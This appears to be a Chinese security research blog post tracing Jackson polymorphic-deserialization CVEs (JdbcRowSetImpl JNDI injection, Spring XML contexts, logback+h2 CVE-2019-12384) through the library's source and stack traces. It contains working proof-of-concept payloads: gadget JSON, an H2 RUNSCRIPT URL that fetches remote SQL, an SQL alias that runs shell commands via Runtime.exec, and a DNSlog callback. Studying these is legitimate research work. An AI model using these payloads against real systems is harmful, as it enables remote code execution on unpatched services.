...
lastmod: 2026-09-09T22:22:00+08:00
image: ""
license: ""
categories:
  - Research
...
检查是否开启了 UNWRAP\_ROOT\_VALUE 配置，一般是没开启的，
...
判断 JsonParser 当前是否停在 JSON 对象的开始符号 START\_OBJECT 上，然后检查 Bean 是否复杂进行分流
...
protected final Object _deserializeOther(JsonParser p, DeserializationContext ctxt, JsonToken t) throws IOException {
    if (t != null) {
        switch (t) {
            case VALUE_STRING:                return this.deserializeFromString(p, ctxt);
            case VALUE_NUMBER_INT:                return this.deserializeFromNumber(p, ctxt);
            case VALUE_NUMBER_FLOAT:                return this.deserializeFromDouble(p, ctxt);
            case VALUE_EMBEDDED_OBJECT:                return this.deserializeFromEmbedded(p, ctxt);
            case VALUE_TRUE:            case VALUE_FALSE:                return this.deserializeFromBoolean(p, ctxt);
            case VALUE_NULL:                return this.deserializeFromNull(p, ctxt);
            case START_ARRAY:                return this._deserializeFromArray(p, ctxt);
            case FIELD_NAME:            case END_OBJECT:                if (this._vanillaProcessing) {
...
### CVE-2017-7525 JdbcRowSetImpl

当时 7525 我只跟了 TemplatesImpl，后来翻 CVE 才发现同一个编号下面还有 `com.sun.rowset.JdbcRowSetImpl`。这个类 JDK 自带，b 不需要再塞 bytecode，看起来比 TemplatesImpl 朴素很多。

它有 `setDataSourceName` 和 `setAutoCommit`。JSON 把 dataSourceName 写成 ldap/rmi，再给 autoCommit 一个 true，反序列化就会进 setter。跟前面 Evil 那个 `setCmd` 是同一条路，只不过这次 setter 自己去连数据源了。跟进 `setAutoCommit`：
...
`lookup(this.getDataSourceName())`，dataSourceName 我们刚 setter 写进去的，就成功 JNDI 注入了。Jackson 这边还是 `MethodProperty.deserializeAndSet` 反射调 setter，和调试 Evil 的时候一样。

```java
import com.fasterxml.jackson.databind.ObjectMapper;

public class PocJdbc {
    public static void main(String[] args) throws Exception {
...
at com.fasterxml.jackson.databind.ObjectMapper._readMapAndClose(ObjectMapper.java:3807)
at com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:2797)
at PocJdbc.main(PocJdbc.java:12)
```

高版本 JDK 默认 `trustURLCodebase=false`，就用高版本打 JNDI 注入的方法，或者是包装成字段或者改成 `@class` 也行，和前面多态写法一样。
...
检查 Token 是否为 START\_OBJECT，检查 Bean 是否简单，如果简单就使用极速模式解析，由于现在 Token 是字符串，所以如下图
...
回头看，多态打开之后 Jackson 其实就这几条赋值路：有 setter 就调 setter（Evil、JdbcRowSetImpl），没有 setter 但 getter 返回 Map/Collection 就走 SetterlessProperty（TemplatesImpl），JSON 第二个元素是字符串就走单参构造（刚才的 Spring XML）。还有两个洞不是 RCE 的，所以我就不想去看了

---

后来总是觉得自己对 jackson 反序列化不熟悉，回来补课，还是翻了一下。

### FileSystemXmlApplicationContext

这个其实和 17485 一模一样，只是类名换了，还是 RCE……当时大概看标题不像命令执行就跳过了。payload 把类名换成它就行，调用栈几乎一样，`<init>` 换成 `FileSystemXmlApplicationContext` 而已，本地文件 `file:///tmp/spel.xml` 也能喂。
...
这个我看了一下，并不是新链。7525 修完发了 2.8.9，黑名单被绕过了，但是打法思路还是那些，不是新的攻击面。后面黑名单一直被绕过，直到 2.10 改成使用 PTV。

### CVE-2019-12384 logback + h2

TemplatesImpl、JdbcRowSetImpl、Spring XML 进黑名单之后，后面又出过 logback 这条。类是 `ch.qos.logback.core.db.DriverManagerConnectionSource`，JSON 里写 `url`，反序列化会走 `setUrl`，这没问题。但我跟进去看，`setUrl` 只是把字符串存进字段，里面没有连库。连接库的方法当然是熟知的 getConnection
...
但是这里 JSON 只有 `url`，没有 `connection` 这个字段，所以 `readValue` 调完 `setUrl` 就结束了，`getConnection` 根本不会被触发，要再 `writeValueAsString` 一下。就和前面调试的一样，序列化会扫一遍 getter，就到了`DriverManager.getConnection(this.url)`。

所以这条其实就是最典型的打 JDBC，classpath 里要有 h2，用 INIT 配合 RUNSCRIPT 即可。
...
public class PocLogback {
    public static void main(String[] args) throws Exception {
        ...
        String json = "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\","
            + "{\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8000/inject.sql'\"}]";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
...
String shellexec(String cmd) throws java.io.IOException {
    ...
    java.util.Scanner s = new java.util.Scanner(
        Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
    return s.hasNext() ? s.next() : "";
}
$$;
CALL SHELLEXEC('id > /tmp/pwned')
```

DNSlog payload

```json
["ch.qos.logback.core.db.DriverManagerConnectionSource",{"url":"jdbc:h2:tcp://xxx.dnslog.cn/"}]
```

`writeValueAsString` 打到 `getConnection` 的调用栈如下：

```java
at java.sql.DriverManager.getConnection(DriverManager.java:664)
at ch.qos.logback.core.db.DriverManagerConnectionSource.getConnection(DriverManagerConnectionSource.java:72)
at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-1)
at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
at java.lang.reflect.Method.invoke(Method.java:497)
...
at com.fasterxml.jackson.databind.ObjectMapper._writeValueAndClose(ObjectMapper.java:4568)
at com.fasterxml.jackson.databind.ObjectMapper.writeValueAsString(ObjectMapper.java:3821)
at PocLogback.main(PocLogback.java:16)
```

后来还看到过把 logback shade 进 New Relic 包名的，CVE-2020-36189，类名变成 `com.newrelic.agent.deps.ch.qos.logback.core.db.DriverManagerConnectionSource`，打法一样。当时要是我会安全就好了，jackson CVE 拿到手软md😤，2.10 之后才改成 PTV 白名单。
...
public class poc {
    ...
    public static Object getPOJONodeStableProxy(Object templatesImpl) throws Exception {
        ...
        Object proxyObj = Proxy.newProxyInstance(                clazz.getClassLoader(),                new Class[]{
            Templates.class, Serializable.class
        }
        ,                handler        );
        return proxyObj;
    }
...
> [https://xz.aliyun.com/news/12292](https://xz.aliyun.com/news/12292)
>
> [https://www.cnblogs.com/LittleHann/p/17811918.html](https://www.cnblogs.com/LittleHann/p/17811918.html)
>
> [https://xz.aliyun.com/news/12412](https://xz.aliyun.com/news/12412)